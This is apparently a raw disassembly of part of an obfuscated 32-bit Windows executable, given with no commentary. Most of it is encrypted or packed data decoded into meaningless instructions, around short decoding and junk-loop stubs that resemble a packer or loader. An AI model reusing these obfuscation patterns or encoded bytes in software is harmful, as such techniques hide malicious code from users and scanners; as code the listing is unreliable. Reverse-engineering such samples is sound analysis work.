  40a845:	mov    cl,0xb4
  40a847:	push   ebp
  40a848:	pop    edx
  40a849:	in     al,0xaa
  40a84b:	popf   
  40a84c:	xlat   BYTE PTR ds:[ebx]
  40a84d:	popa   
  40a84e:	inc    esp
  40a84f:	ror    dl,1
  40a851:	jo     0x40a870
  40a853:	outs   dx,DWORD PTR ds:[esi]
  40a854:	pop    ss
  40a855:	xor    DWORD PTR [edx+0x28],0xffffffff
  40a859:	mov    WORD PTR [esi-0x40],?
  40a85c:	mov    esp,0xa3192d13
  40a861:	sbb    bh,BYTE PTR [ebx]
  40a863:	cmp    ecx,DWORD PTR [esi+0x47f71fd1]
  40a869:	fistp  QWORD PTR [ebp+0x3b0523a8]
  40a86f:	cmp    dl,BYTE PTR [edi+ebp*2]
  40a872:	je     0x40a807
  40a874:	sbb    DWORD PTR [ebp+0x6],ebp
  40a877:	pop    edx
  40a878:	push   edi
  40a879:	retf   0xb85d
  40a87c:	fldenv [esi]
  40a87e:	push   ebx
  40a87f:	adc    bl,BYTE PTR [ebx]
  40a881:	call   0x13e40d04
  40a886:	cmp    eax,0xd8d75317
  40a88b:	fimul  DWORD PTR [edx+0x444431c2]
  40a891:	aad    0x7b
  40a893:	ja     0x40a8d6
  40a895:	imul   edx,DWORD PTR [edi+edx*4-0x60],0x7da00b78
  40a89d:	in     eax,dx
  40a89e:	call   0x7dda:0x96ed1b8b
  40a8a5:	adc    ebx,ebp
  40a8a7:	add    BYTE PTR [edi+0x29],dh
  40a8aa:	or     eax,0x4b21f8eb
  40a8af:	cmp    edx,esi
  40a8b1:	mov    cl,0xc
  40a8b3:	loopne 0x40a83c
  40a8b5:	push   eax
  40a8b6:	ror    DWORD PTR [edi-0x51632299],0x94
  40a8bd:	pop    ebx
  40a8be:	test   eax,0xc066a130
  40a8c3:	int    0x91
  40a8c5:	and    BYTE PTR [edx],dh
  40a8c7:	popaw  
  40a8c9:	popa   
  40a8ca:	retf   0x3f7f
  40a8cd:	mov    ah,0x2b
  40a8cf:	mov    edi,ebp
  40a8d1:	clc    
  40a8d2:	mov    dl,0xb6
  40a8d4:	das    
  40a8d5:	aaa    
  40a8d6:	mov    esp,0x349ba08b
  40a8db:	xor    eax,0x573dd1e8
  40a8e0:	gs test al,0x4b
  40a8e3:	cmp    al,0x38
  40a8e5:	push   ds
  40a8e6:	xor    cl,BYTE PTR [ecx+0x8b65bbe]
  40a8ec:	js     0x40a8ea
  40a8ee:	inc    ebp
  40a8ef:	fld    TBYTE PTR [edx+ebx*4+0x12bad1bf]
  40a8f6:	push   edi
  40a8f7:	daa    
  40a8f8:	jecxz  0x40a8db
  40a8fa:	setns  BYTE PTR [ebp+0x68c018ca]
  40a901:	(bad)  
  40a902:	jnp    0x40a940
  40a904:	and    DWORD PTR [esi+0x4c2a8145],0x64ae5259
  40a90e:	or     eax,0x4270c0b1
  40a913:	rcl    DWORD PTR [ecx+ecx*8+0x68cb18f2],1
  40a91a:	push   edi
  40a91b:	mov    eax,DWORD PTR [ebp-0x4]
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	pop    ss
  40a9a7:	dec    ebp
  40a9a8:	add    edi,DWORD PTR [eax+eiz*8+0x3a]
  40a9ac:	jle    0x40aa2c
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a9be
  40a9b3:	lds    esp,FWORD PTR [esi+0x375f0fa4]
  40a9b9:	push   esp
  40a9ba:	addr16 push esi
  40a9bc:	jl     0x40a96d
  40a9be:	mov    edx,0x63d8c079
  40a9c3:	adc    dh,BYTE PTR [ebx]
  40a9c5:	dec    esi
  40a9c6:	test   eax,0x8a76d594
  40a9cb:	les    ecx,FWORD PTR ds:0xa7314aec
  40a9d1:	jge    0x40a9d2
  40a9d3:	cmp    DWORD PTR [edx-0x58e0ed4e],edi
  40a9d9:	cli    
  40a9da:	jb     0x40aa2a
  40a9dc:	xor    BYTE PTR [eax],ch
  40a9de:	dec    esp
  40a9df:	in     al,0x51
  40a9e1:	(bad)  
  40a9e2:	xor    DWORD PTR [ecx+0x3d],esi
  40a9e5:	icebp  
  40a9e6:	call   0xeb03f530
  40a9eb:	pop    ss
  40a9ec:	cwde   
  40a9ed:	push   esi
  40a9ee:	outs   dx,DWORD PTR ds:[esi]
  40a9ef:	stos   BYTE PTR es:[edi],al
  40a9f0:	dec    ebp
  40a9f1:	mov    ah,0xf8
  40a9f3:	daa    
  40a9f4:	push   es
  40a9f5:	xor    eax,0x88ddbca
  40a9fa:	jb     0x40aa3a
  40a9fc:	and    al,0xab
  40a9fe:	dec    edx
  40a9ff:	push   esp
  40aa00:	stos   BYTE PTR es:[edi],al
  40aa01:	into   
  40aa02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa03:	in     al,dx
  40aa04:	cwde   
  40aa05:	xchg   esi,eax
  40aa06:	js     0x40aa35
  40aa08:	mov    esi,0xd20df3f5
  40aa0d:	mov    cl,0x61
  40aa0f:	mov    bh,0x6c
  40aa11:	(bad)  
  40aa12:	repz jg 0x40a998
  40aa15:	jo     0x40aa1c
  40aa17:	mov    ch,0xbb
  40aa19:	mov    ebp,0xf4029781
  40aa1e:	fnstenv [ebx-0x1627dc71]
  40aa24:	sub    ah,bh
  40aa26:	retf   
  40aa27:	into   
  40aa28:	and    al,ah
  40aa2a:	ret    
  40aa2b:	das    
  40aa2c:	les    edx,FWORD PTR [edx-0x6]
  40aa2f:	neg    DWORD PTR [esi-0x32]
  40aa32:	xchg   edx,eax
  40aa33:	sbb    DWORD PTR [ebx],0xcee3e4bf
  40aa39:	fbstp  TBYTE PTR [edx]
  40aa3b:	out    dx,al
  40aa3c:	retf   0xb5dd
  40aa3f:	sub    bl,BYTE PTR [ebx+0x5f63398a]
  40aa45:	adc    bh,BYTE PTR es:[ecx-0x38]
  40aa49:	retf   0x9095
  40aa4c:	stc    
  40aa4d:	or     eax,0x2e8cbe4a
  40aa52:	jnp    0x40aac7
  40aa54:	push   ecx
  40aa55:	jo     0x40aad6
  40aa57:	push   eax
  40aa58:	popf   
  40aa59:	and    BYTE PTR [esi],cl
  40aa5b:	inc    esi
  40aa5c:	push   ss
  40aa5d:	pop    esi
  40aa5e:	imul   edi,DWORD PTR [eax-0x4bb2f61e],0x68
  40aa65:	inc    ecx
  40aa66:	jle    0x40aa8e
  40aa68:	addr16 or al,0x6b
  40aa6b:	repnz fcom DWORD PTR [ebx-0x39]
  40aa6f:	jmp    0xd2d0:0xb5e90320
  40aa76:	add    BYTE PTR [edx],dl
  40aa78:	sub    ebp,ebp
  40aa7a:	(bad)  
  40aa7b:	scas   al,BYTE PTR es:[edi]
  40aa7c:	sub    bl,ch
  40aa7e:	xchg   ebp,eax
  40aa7f:	int3   
  40aa80:	sub    dh,BYTE PTR ds:0x6dff0e52
  40aa86:	push   esp
  40aa87:	or     cl,BYTE PTR [edx]
  40aa89:	fdiv   st(4),st
  40aa8b:	or     al,0x33
  40aa8d:	mov    DWORD PTR [ecx-0x6d407535],edx
  40aa93:	sbb    al,bl
  40aa95:	jl     0x40aaa5
  40aa97:	iret   
  40aa98:	sar    DWORD PTR fs:[esi+ebx*2+0x41],cl
  40aa9d:	mov    eax,ds:0x8d4d797e
  40aaa2:	jl     0x40aaec
  40aaa4:	in     al,0xc8
  40aaa6:	dec    esp
  40aaa7:	add    DWORD PTR gs:[ebx-0x7c],0x20890d1a
  40aaaf:	int    0xe1
  40aab1:	repz dec esi
  40aab3:	sbb    BYTE PTR [ebx+ebx*8+0x6c],dh
  40aab7:	adc    eax,0x926f14c0
  40aabc:	push   0x5a72091d
  40aac1:	add    eax,0xd1a76bb9
  40aac6:	pop    edx
  40aac7:	icebp  
  40aac8:	aas    
  40aac9:	sbb    cl,BYTE PTR [eax]
  40aacb:	inc    esi
  40aacc:	add    esi,DWORD PTR [eax+0x8]
  40aacf:	int3   
  40aad0:	push   edi
  40aad1:	(bad)  
  40aad2:	cmp    BYTE PTR [ebx+eiz*2-0x1d6ca9a6],ah
  40aad9:	jbe    0x40ab35
  40aadb:	(bad)  
  40aadc:	(bad)  
  40aadd:	or     DWORD PTR [esi+0x4f],0x1e
  40aae1:	cmc    
  40aae2:	adc    DWORD PTR [eax+0x47892bf7],0xbc5b5235
  40aaec:	sti    
  40aaed:	mov    bh,0xcd
  40aaef:	fmul   st(5),st
  40aaf1:	test   al,0xd9
  40aaf3:	dec    ecx
  40aaf4:	sub    BYTE PTR [ebx+0x32],al
  40aaf7:	test   eax,0xed47fd09
  40aafc:	fiadd  WORD PTR [ebx-0x1e]
  40aaff:	add    ebx,DWORD PTR [edi-0x109a810]
  40ab05:	and    bh,BYTE PTR [ebp-0x65]
  40ab08:	dec    ecx
  40ab09:	out    0x97,al
  40ab0b:	pop    eax
  40ab0c:	rdpmc  
  40ab0e:	ret    0xf233
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x450dac8b
  40ab26:	sub    DWORD PTR [edi+ecx*2+0x3b],ebx
  40ab2a:	jle    0x40abaa
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40ab41
  40ab31:	stos   DWORD PTR es:[edi],eax
  40ab32:	add    al,0x2a
  40ab34:	les    esi,FWORD PTR [ecx+0x4a46ab06]
  40ab3a:	cli    
  40ab3b:	mov    DWORD PTR [ecx+0x6de8aa77],esp
  40ab41:	dec    edx
  40ab42:	leave  
  40ab43:	test   DWORD PTR ds:0xc3d54534,ebx
  40ab49:	sbb    DWORD PTR ds:[edx-0x7d],0xffffffdc
  40ab4e:	inc    ebp
  40ab4f:	lods   eax,DWORD PTR ds:[esi]
  40ab50:	add    edx,DWORD PTR [eax]
  40ab52:	inc    ebp
  40ab53:	es imul esi,esp,0x5dd2fd3
  40ab5a:	leave  
  40ab5b:	scas   al,BYTE PTR es:[edi]
  40ab5c:	jbe    0x40ab15
  40ab5e:	in     eax,0x52
  40ab60:	xchg   esp,eax
  40ab61:	std    
  40ab62:	shl    BYTE PTR [edx-0xf],cl
  40ab65:	push   esp
  40ab66:	push   cs
  40ab67:	es retf 0xba76
  40ab6b:	fbld   TBYTE PTR [edx+0x34ba1c72]
  40ab71:	das    
  40ab72:	and    BYTE PTR [eax-0x449106b],dh
  40ab78:	dec    ebp
  40ab79:	jmp    0x4dc9:0x8f9a43fd
  40ab80:	sbb    ecx,DWORD PTR [ebx-0x4f]
  40ab83:	add    DWORD PTR [ecx+0x53c308c2],0x4297052b
  40ab8d:	xchg   ecx,eax
  40ab8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab8f:	idiv   esi
  40ab91:	lock pop ebp
  40ab93:	mov    ebp,0x9b650382
  40ab98:	sub    ebx,DWORD PTR [edi+0x4]
  40ab9b:	inc    ebx
  40ab9c:	leave  
  40ab9d:	hlt    
  40ab9e:	dec    esi
  40ab9f:	jl     0x40ab64
  40aba1:	jmp    FWORD PTR [ecx+0x63421553]
  40aba7:	dec    ebx
  40aba8:	(bad)  
  40aba9:	out    0x62,eax
  40abab:	cmp    al,0x9e
  40abad:	pop    esp
  40abae:	mov    ebp,DWORD PTR [eax-0x1fe1a98a]
  40abb4:	int3   
  40abb5:	dec    esp
  40abb6:	dec    ebx
  40abb7:	mov    al,ds:0xcf6f69af
  40abbc:	test   eax,0xf0825cf1
  40abc1:	dec    edi
  40abc2:	icebp  
  40abc3:	adc    BYTE PTR [ebx],dh
  40abc5:	xor    eax,0x1fb790bb
  40abca:	jmp    0xa415140
  40abcf:	mov    ax,ds:0x6b4bd95
  40abd5:	nop
  40abd6:	inc    edi
  40abd7:	mov    cl,0xd6
  40abd9:	sub    DWORD PTR [esi+0x68],esp
  40abdc:	movhps xmm6,QWORD PTR [edx]
  40abdf:	or     eax,0x999bfa30
  40abe4:	pop    ebx
  40abe5:	push   eax
  40abe6:	cli    
  40abe7:	mov    eax,0x3e7246f7
  40abec:	ja     0x40ac31
  40abee:	imul   edi,DWORD PTR [edi+0x29],0xffffffd8
  40abf2:	adc    dh,BYTE PTR ds:0x7f7a547a
  40abf8:	fnop   
  40abfa:	and    ebx,ecx
  40abfc:	je     0x40ac5c
  40abfe:	(bad)  
  40ac00:	test   BYTE PTR [ebp-0x15],bh
  40ac03:	sub    ebx,DWORD PTR [eax-0x64]
  40ac06:	outs   dx,BYTE PTR ds:[esi]
  40ac07:	jmp    0x40ac13
  40ac09:	mov    dl,cl
  40ac0b:	dec    esp
  40ac0c:	mov    dl,0x5f
  40ac0e:	popf   
  40ac0f:	cs dec ecx
  40ac11:	pop    es
  40ac12:	bound  esp,QWORD PTR [eax+0x54]
  40ac15:	xor    edi,DWORD PTR [esi]
  40ac17:	out    dx,eax
  40ac18:	test   DWORD PTR [ebx],eax
  40ac1a:	xor    esi,ebx
  40ac1c:	jmp    0xb0beb071
  40ac21:	mov    esi,0xe6620293
  40ac26:	push   0xfffffffc
  40ac28:	jmp    0xb6ab6319
  40ac2d:	bound  ecx,QWORD PTR [ebx-0x38]
  40ac30:	or     eax,0xb60bb01a
  40ac35:	jns    0x40ac6b
  40ac37:	jmp    FWORD PTR [ecx-0x16]
  40ac3a:	push   ebp
  40ac3b:	jecxz  0x40ac26
  40ac3d:	dec    ebp
  40ac3e:	jb     0x40ac46
  40ac40:	ins    BYTE PTR es:[edi],dx
  40ac41:	sub    BYTE PTR [esi+0x44c52069],dh
  40ac47:	lds    eax,FWORD PTR [edx+0x75347bc]
  40ac4d:	ss push eax
  40ac4f:	push   esi
  40ac50:	xor    al,0x41
  40ac52:	fldcw  WORD PTR [eax+0xa]
  40ac55:	das    
  40ac56:	shl    BYTE PTR [ebp-0x1a],cl
  40ac59:	sbb    eax,0x31ec6cf8
  40ac5e:	mov    eax,0xd9e8ead3
  40ac63:	dec    edi
  40ac64:	loop   0x40ac14
  40ac66:	out    dx,eax
  40ac67:	and    BYTE PTR [ecx-0x49],ah
  40ac6a:	cmp    BYTE PTR [eax-0x52c9cb74],ch
  40ac70:	and    al,0x14
  40ac72:	mov    ah,0x98
  40ac74:	fcomp  QWORD PTR [esi+eiz*4+0x233eea2e]
  40ac7b:	jmp    0xa0558bde
  40ac80:	push   DWORD PTR [ebp+0x262b9b20]
  40ac86:	pop    edi
  40ac87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac88:	xchg   ebx,eax
  40ac89:	xlat   BYTE PTR ds:[ebx]
  40ac8a:	cld    
  40ac8b:	add    esi,ecx
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edx,DWORD PTR [edi]
  40acbc:	cmp    al,0xff
  40acbe:	push   esp
  40acbf:	sub    bh,BYTE PTR [ecx]
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40acbb
  40acc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acc9:	fs stc 
  40accb:	jno    0x40ac89
  40accd:	xor    eax,0xd3626a7d
  40acd2:	(bad)  
  40acd3:	ds jle 0x40ac81
  40acd6:	xor    ah,BYTE PTR [edi+edi*4+0x5e]
  40acda:	jb     0x40acc8
  40acdc:	cmp    ah,dl
  40acde:	jge    0x40acdd
  40ace0:	mov    al,0x14
  40ace2:	push   edx
  40ace3:	es xchg ecx,eax
  40ace5:	sub    al,0x1c
  40ace7:	push   cs
  40ace8:	leave  
  40ace9:	loope  0x40acb4
  40aceb:	jecxz  0x40acba
  40aced:	aam    0x6f
  40acef:	push   0x6c
  40acf1:	mov    ah,0x8a
  40acf3:	xor    eax,0x602cacaa
  40acf8:	dec    esp
  40acf9:	inc    edx
  40acfa:	xor    edi,edi
  40acfc:	inc    esi
  40acfd:	(bad)  
  40acff:	lds    ebp,FWORD PTR [edx+0x3de2ea7b]
  40ad05:	ret    0x4278
  40ad08:	dec    ecx
  40ad09:	and    al,0x8a
  40ad0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad0c:	push   eax
  40ad0d:	lock scas al,BYTE PTR es:[edi]
  40ad0f:	sub    DWORD PTR [ebx-0x33],0xffffffe8
  40ad13:	pop    ds
  40ad14:	in     al,0x20
  40ad16:	lea    esi,[ebx-0x4b]
  40ad19:	cld    
  40ad1a:	add    BYTE PTR [ebx+0x72],cl
  40ad1d:	ret    
  40ad1e:	push   edx
  40ad1f:	stc    
  40ad20:	popa   
  40ad21:	stc    
  40ad22:	mov    ch,BYTE PTR [edi-0x583df353]
  40ad28:	xchg   ebp,eax
  40ad29:	pop    esp
  40ad2a:	not    DWORD PTR [ebp+0x72]
  40ad2d:	pop    ds
  40ad2e:	sub    edi,DWORD PTR [ebp-0x3423b98]
  40ad34:	les    ebp,FWORD PTR [edx-0x18]
  40ad37:	sbb    eax,0xae81b07c
  40ad3c:	ins    BYTE PTR es:[edi],dx
  40ad3d:	jno    0x40acc6
  40ad3f:	jns    0x40adb3
  40ad41:	inc    edx
  40ad42:	mov    ss,WORD PTR [edx+0x4a]
  40ad45:	pop    ecx
  40ad46:	inc    edx
  40ad47:	sub    bl,bl
  40ad49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad4a:	adc    eax,0xfa7be50c
  40ad4f:	push   eax
  40ad50:	call   0x3078:0x3f80da41
  40ad57:	jmp    DWORD PTR [esi-0x4b]
  40ad5a:	mov    dl,BYTE PTR [ebp-0x7f248d8a]
  40ad60:	mov    ecx,0x38667c6
  40ad65:	test   BYTE PTR [ebx+0x64],bl
  40ad68:	and    BYTE PTR [eax+eax*4],ah
  40ad6b:	sub    eax,0x1743e623
  40ad70:	ret    0xf87b
  40ad73:	dec    eax
  40ad74:	pushf  
  40ad75:	xor    bx,WORD PTR [esi-0x1a7c59]
  40ad7c:	mov    dh,0xe3
  40ad7e:	int    0x8c
  40ad80:	leave  
  40ad81:	icebp  
  40ad82:	out    0xc,al
  40ad84:	leave  
  40ad85:	mov    dh,0x9c
  40ad87:	scas   al,BYTE PTR es:[edi]
  40ad88:	popf   
  40ad89:	push   ebx
  40ad8a:	ins    BYTE PTR es:[edi],dx
  40ad8b:	aad    0x68
  40ad8d:	(bad)  
  40ad8f:	mov    ds:0x2bffac76,al
  40ad94:	push   0xffffffdd
  40ad96:	cmp    DWORD PTR [eax-0x9ff737],ecx
  40ad9c:	sahf   
  40ad9d:	out    dx,al
  40ad9e:	sub    al,0x4d
  40ada0:	xor    BYTE PTR [ebx-0x5d],bh
  40ada3:	cmp    BYTE PTR [eax-0x1ca10026],ch
  40ada9:	test   al,0xd3
  40adab:	ficom  DWORD PTR [ebx-0x4df2551d]
  40adb1:	add    dh,BYTE PTR [esi+ebx*8+0xbbd7738]
  40adb8:	scas   al,BYTE PTR es:[edi]
  40adb9:	add    BYTE PTR [ebp+0x67147ac],cl
  40adbf:	jno    0x40ad60
  40adc1:	iret   
  40adc2:	add    BYTE PTR [esi+0xbd8975a],cl
  40adc8:	push   ebx
  40adc9:	dec    esi
  40adca:	inc    edx
  40adcb:	repnz fst DWORD PTR [eax+0x18]
  40adcf:	xchg   ecx,eax
  40add0:	retf   0x3ac4
  40add3:	(bad)  
  40add5:	aad    0x97
  40add7:	mov    edx,0xecfc3ef8
  40addc:	and    DWORD PTR [eax],esp
  40adde:	(bad)  
  40ade0:	mov    ebp,0xb22eb9f4
  40ade5:	fwait
  40ade6:	add    al,0x53
  40ade8:	mov    esi,DWORD PTR [ebx+0x3d]
  40adeb:	sbb    BYTE PTR [eax-0x262a5dd],bh
  40adf1:	jmp    0x7615bc64
  40adf6:	dec    ecx
  40adf7:	std    
  40adf8:	jge    0x40ad97
  40adfa:	inc    edx
  40adfb:	fsub   st(7),st
  40adfd:	sbb    DWORD PTR [esi-0x4d5721f7],eax
  40ae03:	pop    esi
  40ae04:	retf   0x6edc
  40ae07:	or     eax,0x3bd2a0da
  40ae0c:	mov    ebp,0x5566f1c0
  40ae11:	lea    esi,[edx+0x3e]
  40ae14:	xor    al,0x8
  40ae16:	xchg   esp,eax
  40ae17:	nop
  40ae18:	lock inc eax
  40ae1a:	and    eax,0x9b1fe2b
  40ae1f:	jmp    0xaf0f:0xf10346e0
  40ae26:	(bad)  
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x8e268d5d
  40ae94:	popa   
  40ae95:	leave  
  40ae96:	jae    0x40ae89
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	lods   al,BYTE PTR ds:[esi]
  40aea0:	popa   
  40aea1:	adc    eax,0x87f250ff
  40aea6:	xor    eax,0xd786d5d9
  40aeab:	ds xchg ebp,eax
  40aead:	loop   0x40ae6b
  40aeaf:	jmp    0x40ae9b
  40aeb1:	je     0x40aeff
  40aeb3:	sub    eax,0x58b73068
  40aeb8:	jnp    0x40af02
  40aeba:	fdivp  st(6),st
  40aebc:	mov    ds:0x68b8844b,al
  40aec1:	imul   ebp,DWORD PTR [esi-0x2a24345f],0x8b550779
  40aecb:	lds    ecx,FWORD PTR [ebx]
  40aecd:	mov    al,ds:0xb8cb6e6a
  40aed2:	in     al,dx
  40aed3:	rol    BYTE PTR [edx+0x6832a669],0x6f
  40aeda:	inc    ebp
  40aedb:	xor    esp,DWORD PTR [esi+ecx*4]
  40aede:	mov    edx,0x83e52dee
  40aee3:	mov    ss:0xf6607e9e,eax
  40aee9:	out    dx,eax
  40aeea:	mov    ecx,0x604564d3
  40aeef:	cmp    BYTE PTR [eax+0x29],dl
  40aef2:	test   dl,0x57
  40aef5:	cs jmp 0x40af3b
  40aef8:	mov    ebp,0x526f3f61
  40aefd:	fwait
  40aefe:	xor    al,0x22
  40af00:	arpl   WORD PTR [eax],bx
  40af02:	jg     0x40af0f
  40af04:	mov    edi,edx
  40af06:	cmp    edx,eax
  40af08:	cmp    DWORD PTR [ebx],0xd2916467
  40af0e:	pop    es
  40af0f:	cmp    bh,BYTE PTR fs:[esi+0x1f2752b0]
  40af16:	sbb    dl,BYTE PTR [ebx+0x9]
  40af19:	rol    DWORD PTR [ebx+ebp*4],0xd5
  40af1d:	outs   dx,DWORD PTR ds:[esi]
  40af1e:	cdq    
  40af1f:	and    DWORD PTR [esi],edi
  40af21:	sub    dl,cl
  40af23:	dec    ebx
  40af24:	jno    0x40af78
  40af26:	(bad)  
  40af27:	(bad)  
  40af28:	pop    ds
  40af29:	jo     0x40aeeb
  40af2b:	inc    esp
  40af2c:	mov    ah,0x5
  40af2e:	rol    DWORD PTR [edx+0x2e6ed5a7],cl
  40af34:	adc    BYTE PTR [edi+0x6118bbb1],ah
  40af3a:	jne    0x40afaa
  40af3c:	test   al,0x5c
  40af3e:	or     al,0xf0
  40af40:	mov    ds:0x529130e,al
  40af45:	sar    BYTE PTR [esi+0x52db4b6d],1
  40af4b:	stc    
  40af4c:	jae    0x40af06
  40af4e:	sahf   
  40af4f:	sbb    DWORD PTR [ebp+0x7078c915],0x5e504d94
  40af59:	data16 js 0x40af51
  40af5c:	cmp    esi,0x5f
  40af5f:	fsubr  st,st(4)
  40af61:	cmp    al,0x46
  40af63:	jno    0x40aef7
  40af65:	adc    eax,0x729fbbe5
  40af6a:	xor    al,BYTE PTR [eax]
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x53]
  40b0b6:	ror    esi,0x98
